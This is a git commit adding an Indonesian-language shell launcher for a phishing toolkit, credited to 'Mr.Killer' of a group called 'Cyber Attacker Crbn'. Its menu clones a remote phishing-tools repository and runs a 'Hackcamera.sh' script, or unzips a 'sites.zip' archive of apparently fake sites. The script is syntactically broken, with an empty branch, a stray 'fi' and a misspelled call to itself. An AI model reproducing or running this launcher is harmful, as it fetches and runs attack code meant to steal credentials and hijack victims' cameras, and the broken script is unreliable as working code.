c79a506b26f46d8b4f6a4adb7f83ee6e529119f1
M4DN3SSKILLER123 <52645408+M4DN3SSKILLER123@users.noreply.github.com>
2019-07-24 08:53:08 +0700

    Add files via upload

---
+++ PhisingToolsV1.2.sh
@@ -0,0 +1,48 @@
+echo "╔═╗╔══╗╔══╗╔╗╔╗╔══╗╔═╦╗╔══╗╔══╗╔═╗╔═╗╔╗─╔══╗"
+echo "║╬║╚║║╝║══╣║╚╝║╚║║╝║║║║║╔═╣╚╗╔╝║║║║║║║║─║══╣"
+echo "║╔╝╔║║╗╠══║║╔╗║╔║║╗║║║║║╚╗║─║║─║║║║║║║╚╗╠══║"
+echo "╚╝─╚══╝╚══╝╚╝╚╝╚══╝╚╩═╝╚══╝─╚╝─╚═╝╚═╝╚═╝╚══╝"
+
+echo "\033[32;1m@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
+echo "\033[32;1mAuthor : Mr.Killer              |"
+echo "\033[32;1mVersion: 1.2                    |"
+echo "\033[32;1mTeam   : Cyber Attacker Crbn    |"
+echo "\033[32;1m@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
+echo "\033[32;1m"
+echo "\033[32;1m"
+echo "\033[32;1m"
+echo "\033[32;1mNo tlp me : 083120840944"
+echo "Gunakan Tools Dengan Bijak"
+
+echo "\033[32;1mPerhatian Download Server terlebi dahulu"
+echo "\033[32;1mTampa Mendownload nya tidak akan bisa di gunakan[!]"
+echo "\033[32;1m"
+echo "\033[32;1m"
+echo "\033[31;1mJika kamu baru memakai tools ini harap klik nomor 1 terlebidahulu agar berjalan tools nya lalu lanjut ketik no 2"
+echo "\033[32;1m[1]>Download Server Penting"
+echo "\033[32;1m[2]>Masuk Ke Tools"
+echo "\033[32;1mPilih jangan ragu"
+read -p "Pilih Nomor#==>" bod
+
+if [ $bod = 1 ] || [ $bod =1 ]
+then
+echo "\033[32;1mTunggu pengunduhan selesai" echo "\033[32;1mPlease Wait Server..."
+sleep 1
+clear
+echo "\033[32;1mServer Download" echo "\033[32;1m[/]"
+sleep 5
+clear
+git clone  https://github.com/M4DN3SSKILLER123/PhisingMr.Killer-Tools
+clear
+echo "Pengunduhan Selesai"
+sh Hackcamera.sh
+fi
+
+if [ $bod = 2 ] || [ $bod =2 ]
+then
+fi
+unzip sites.zip
+echo "Wwwwwwwwwwww"
+bash PishingToolsV1.2.sh
+fi
+
